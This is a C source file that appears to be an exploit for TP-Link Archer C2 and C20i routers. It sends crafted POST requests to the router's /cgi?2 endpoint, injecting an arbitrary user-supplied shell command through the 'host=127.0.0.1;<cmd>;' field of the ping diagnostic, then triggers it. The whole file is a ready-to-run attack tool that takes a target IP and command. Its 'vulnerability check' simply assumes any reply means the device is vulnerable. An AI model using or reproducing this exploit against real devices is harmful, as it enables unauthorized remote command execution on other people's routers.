// "TP-Link Archer C2, TP-Link Archer C20i

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>

#define MAX_RESPONSE_SIZE 8192
#define TARGET_PORT 80

// Function to create an HTTP POST request
void create_http_post_request(const char *target_ip, const char *data, const char *referer, char *request, size_t request_size) {
    snprintf(request, request_size,
             "POST /cgi?2 HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Content-Type: text/plain\r\n"
             "Referer: %s\r\n"
             "Connection: close\r\n"
             "Content-Length: %lu\r\n\r\n"
             "%s",
             target_ip, referer, strlen(data), data);
}

// Function to send an HTTP POST request and receive the response
int send_http_post_request(const char *target_ip, const char *data, const char *referer) {
    int sock;
    struct sockaddr_in server_addr;
    char request[2048];
    char response[MAX_RESPONSE_SIZE];
    int bytes_received;

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return -1;
    }

    // Set up server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(TARGET_PORT);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    // Connect to the server
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return -1;
    }

    // Create and send the HTTP POST request
    create_http_post_request(target_ip, data, referer, request, sizeof(request));
    send(sock, request, strlen(request), 0);

    // Receive the response
    memset(response, 0, sizeof(response));
    bytes_received = recv(sock, response, sizeof(response) - 1, 0);
    close(sock);

    if (bytes_received < 0) {
        perror("Receive failed");
        return -1;
    }

    response[bytes_received] = '\0'; // Null-terminate the response
    return bytes_received;
}

// Function to execute a command
void execute_command(const char *target_ip, const char *cmd) {
    char referer[256];
    snprintf(referer, sizeof(referer), "http://%s/mainFrame.htm", target_ip);

    char data[512];
    snprintf(data, sizeof(data),
             "[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6\r\n"
             "dataBlockSize=64\r\n"
             "timeout=1\r\n"
             "numberOfRepetitions=1\r\n"
             "host=127.0.0.1;%s;\r\n"
             "X_TP_ConnName=ewan_ipoe_s\r\n"
             "diagnosticsState=Requested\r\n", cmd);

    // Send command
    send_http_post_request(target_ip, data, referer);

    // Prepare the second data block to execute the command
    snprintf(data, sizeof(data), "[ACT_OP_IPPING#0,0,0,0,0,0#0,0,0,0,0,0]0,0\r\n");

    // Execute command on device
    send_http_post_request(target_ip, data, referer);
    sleep(1); // Wait for a while
}

// Function to check if the target is vulnerable
int check_vulnerability(const char *target_ip) {
    char referer[256];
    snprintf(referer, sizeof(referer), "http://%s/mainFrame.htm", target_ip);

    char data[512];
    snprintf(data, sizeof(data),
             "[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6\r\n"
             "dataBlockSize=64\r\n"
             "timeout=1\r\n"
             "numberOfRepetitions=1\r\n"
             "host=127.0.0.1\r\n"
             "X_TP_ConnName=ewan_ipoe_s\r\n"
             "diagnosticsState=Requested\r\n");

    int response_length = send_http_post_request(target_ip, data, referer);
    if (response_length < 0) {
        return 0; // Target is not vulnerable
    }

    // Check for vulnerability in the response
    // Here you would typically analyze the response to determine if the target is vulnerable
    // For simplicity, we assume a successful response indicates vulnerability
    return 1; // Target is vulnerable
}

// Main function
int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target_ip> <username> <command>\n", argv[0]);
        return EXIT_FAILURE;
    }

    const char *target_ip = argv[1]; // Target IP from command line argument
    const char *username = argv[2]; // Username from command line argument
    const char *cmd = argv[3]; // Command to execute from command line argument

    if (check_vulnerability(target_ip)) {
        execute_command(target_ip, cmd);
    }

    return EXIT_SUCCESS;
}
